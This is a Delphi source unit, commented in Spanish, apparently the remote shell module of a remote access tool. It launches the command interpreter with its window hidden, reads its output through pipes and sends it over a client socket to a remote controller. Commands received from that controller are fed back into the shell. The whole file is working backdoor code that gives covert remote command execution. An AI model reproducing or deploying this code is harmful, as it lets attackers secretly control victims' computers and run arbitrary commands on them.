unit UnitShell;

interface

uses
  Windows, Messages, {ScktComp,} SocketUnit, SysUtils, unitfunciones;

type
  TShellParameters = record
    Cliente: TClientSocket;
  end;
  PShellParameters = ^TShellParameters;

var
  ShellThreadID: DWord;
//  sock: TClientSocket;

const
  ENTER = #10;

procedure ShellThread(P: Pointer); stdcall;

implementation

procedure ShellThread(P: Pointer); stdcall;
 //A este thread se le pasa como parametro un puntero a una esctructura
 //TShellParameters, que contiene el Socket al que hay que escribirle el
 //output de la consola.

var
  StartupInfo: TStartupInfo;
  ProcessInformation: TProcessInformation;
  Secu:    PSecurityAttributes;
  hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2, BytesRead, exitcode: dword;
  ComSpec: array [0..MAX_PATH] of char;
  Buf:     array [0..1024] of char;
  MemBuf:  array of char;
  msg:     TMsg;
  TempStr: string;
  Cliente: TClientSocket; //Socket to write output to
begin
  Cliente := PShellParameters(P)^.Cliente;

  GetMem(Secu, sizeof(SECURITY_ATTRIBUTES));
  Secu.nLength := SizeOf(SECURITY_ATTRIBUTES);
  Secu.bInheritHandle := True;
  Secu.lpSecurityDescriptor := nil;
  CreatePipe(hPipeRead1, hPipeWrite1, Secu, 0);
  CreatePipe(hPipeRead2, hPipeWrite2, Secu, 0);
  //La variable de entorno COMSPEC contiene la ruta a el ejecutable de la shell
  //ejemplo C:\windows\system32\cmd.exe
  GetEnvironmentVariable('COMSPEC', ComSpec, sizeof(ComSpec));
  ZeroMemory(@StartupInfo, SizeOf(StartupInfo));
  StartupInfo.cb      := SizeOf(StartupInfo);
  StartupInfo.dwFlags := STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW;
  StartupInfo.wShowWindow := SW_HIDE;
  StartupInfo.hStdInput := hPipeRead2;
  StartupInfo.hStdOutput := hPipeWrite1;
  StartupInfo.hStdError := hPipeWrite1;
  if CreateProcess(nil, ComSpec, Secu, Secu, True, 0, nil, nil, StartupInfo, ProcessInformation) =
    True then
    while cliente.connected do
    begin //main loop
      GetExitCodeProcess(ProcessInformation.hProcess,{var }exitcode);
      if exitcode <> STILL_ACTIVE then
        break;
      TempStr := '';
      PeekNamedPipe(hPipeRead1, nil, 0, nil, @BytesRead, nil);
      while BytesRead > 0 do
      begin
        if ReadFile(hPipeRead1, Buf, sizeof(Buf), BytesRead, nil) then
        begin
          TempStr := TempStr + Copy(Buf, 1, bytesRead);
        end
        else
          break;
        PeekNamedPipe(hPipeRead1, nil, 0, nil, @BytesRead, nil);
      end; //while BytesRead > 0
      PostThreadMessage(ShellThreadID, 0, 0, 0);

      if Length(TempStr) > 0 then //enviar datos
      begin
        //    if Cliente.Active then
        if Cliente.Connected then
        begin
          //MessageBox(0, 'Cliente.Active = True','',0);
          TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
          TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);

          Cliente.SendString('SHELL|' {+ IntToStr(Length(TempStr) - 1)} + TempStr + ENTER);
        end
        else
          Break; //si el cliente no esta activo entonces se cierra
      end;
            sleep(300);
      GetMessage(msg, 0, 0, 0);
      if (msg.message = WM_ACTIVATE) then
      begin
        WriteFile(hPipeWrite2, PChar(msg.lParam)^, msg.wParam, BytesRead, nil);
        WriteFile(hPipeWrite2, #13#10, 2, BytesRead, nil);
      end;
    end; //main loop
	
  if cliente.Connected then
    Cliente.SendString('SHELL|DESACTIVAR' + ENTER);

  TerminateProcess(ProcessInformation.hProcess, 0);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  FreeMem(Secu);
  ShellThreadID := 0;
end;
   {
procedure ShellPostMessageTimer;
begin
  //esta funcion se pone en un timer para que postee mensajes cada segundo para
  //que la el thread de la shell no se bloquee en GetMessage
  if ShellThreadID <> 0 then
    PostThreadMessage(ShellThreadID, 0, 0, 0);
end;       }

begin
  ShellThreadID := 0;
 // SetTimer(0, 0, 1000, @ShellPostMessageTimer);
end.
